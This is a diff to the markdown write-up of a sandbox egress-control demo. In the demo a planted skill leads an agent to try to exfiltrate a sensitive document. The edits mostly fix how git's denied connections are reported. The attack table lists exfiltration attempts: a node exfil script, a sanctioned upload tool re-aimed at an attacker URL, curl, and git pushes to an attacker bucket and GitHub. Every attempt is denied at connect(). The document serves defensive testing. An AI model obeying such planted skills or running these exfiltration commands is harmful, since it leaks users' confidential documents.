@@ -214,8 +214,8 @@ what is legitimate and swap the parameters.
 | "I'll use the sanctioned runtime with my own script" | `node ~/exfil.mjs` to the attacker bucket | `EACCES` at `connect()` |
 | "The tool is legit — I'll re-aim it at my bucket and send the source document" | `node ~/bin/upload-results.mjs <raw doc> <attacker URL>` | `EACCES` at `connect()` |
 | "Maybe plain curl" | `command -v curl` | no curl in the image either |
-| "Fine — git, then. I'll push the document to a repo" | `/usr/bin/git ls-remote` to the attacker bucket *and* the results server | `EACCES` both ways — the results-server entry names one binary: node-26 |
-| "There's a second git in /usr/sbin — maybe it has different rights" | `/usr/sbin/git ls-remote` against GitHub itself | `EACCES` — same bytes, unlisted path, no rights |
+| "Fine — git, then. I'll push the document to a repo" | `/usr/bin/git ls-remote` to the attacker bucket *and* the results server | denied at `connect()` both ways — the results-server entry names one binary: node-26 |
+| "There's a second git in /usr/sbin — maybe it has different rights" | `/usr/sbin/git ls-remote` against GitHub itself | denied at `connect()` — same bytes, unlisted path, no rights |
 
 The third row is the story's heart. The attacker did everything right by
 tool standards: the sanctioned binary, the sanctioned script, a file the
@@ -236,9 +236,12 @@ results-server entry names exactly one binary, and git is not it. The
 destination that answers node-26's POST refuses git's connection at
 `connect()`: the policy grants *binary × endpoint* pairs, not endpoints.
 And git's exit code alone cannot prove that denial — a non-git
-destination also makes `ls-remote` fail — so the demo asserts the
-connect-level error text plus unchanged request counts, the threat
-model's controlled-destination rule.
+destination also makes `ls-remote` fail. libcurl does not surface the
+kernel's `EACCES`, so a policy denial renders as `Failed to connect
+... Could not connect to server`; the demo asserts that connect-level
+failure against a results server the sanctioned flow just showed
+answering, plus unchanged request counts — the threat model's
+controlled-destination rule.
 
 The twin-git row is the same lesson from the other direction, and it was
 found in the wild: the image ships two byte-identical, unlinked copies
@@ -273,7 +276,7 @@ loudly rather than silently.
 | --- | --- | --- | --- |
 | 1-2 | Sensitive documents, sanctioned tool, planted skill | (none — the victim's mistake, replayed) | All data synthetic; skill payload shown |
 | 3 | The sanctioned flow | Sanctioned `binary × endpoint` | Summary uploaded; results server counts it |
-| 4 | The skill's ladder | Per-binary, per-endpoint egress; minimal image | Network vectors denied at `connect()` with `EACCES`; Python and curl absent; attacker count unchanged |
+| 4 | The skill's ladder | Per-binary, per-endpoint egress; minimal image | Denied at `connect()` (node: `EACCES`; git: libcurl connect failure); Python and curl absent; attacker count unchanged |
 | 5 | — | Audit logging | `transparent_tcp_policy_denied` on the record |
 | 6 | Same network, outside the boundary | Controlled-destination contrast | Host reaches both servers; sandbox reaches only the results endpoint |
 | 6 (end) | The raw document to the *results server* | (none — and none needed; see below) | Upload succeeds, inside the perimeter |
@@ -302,8 +305,8 @@ byte leaves the host — synchronously, at `connect()`:
 
 ```text
 connect error: EACCES
-fatal: unable to access 'http://host.openshell.internal:18081/upload': Failed to connect to host.openshell.internal port 18081: Operation not permitted
-fatal: unable to access 'https://github.com/redhat-et/secure-single-server.git/': Failed to connect to github.com port 443: Operation not permitted
+fatal: unable to access 'http://host.openshell.internal:18081/upload/': Failed to connect to host.openshell.internal:18081 after 9 ms: Could not connect to server
+fatal: unable to access 'https://github.com/redhat-et/secure-single-server.git/': Failed to connect to github.com after 36 ms: Could not connect to server
 ```
 
 The Python fallback dies differently — no interpreter:
@@ -385,6 +388,7 @@ not inspect content:
 - The twin-git act attempts GitHub — the one destination its
   policy-listed twin may reach — and is denied at `connect()` before any
   packet; no external traffic occurs.
-- Every denial is asserted two ways — `EACCES` from the pinned network
-  layer and an unchanged server-side request count — per the threat
-  model's rule that failed commands alone are not denial evidence.
+- Every denial is asserted with the client-visible failure (node's
+  `EACCES`; git's libcurl connect failure) plus an unchanged
+  server-side request count — per the threat model's rule that failed
+  commands alone are not denial evidence.
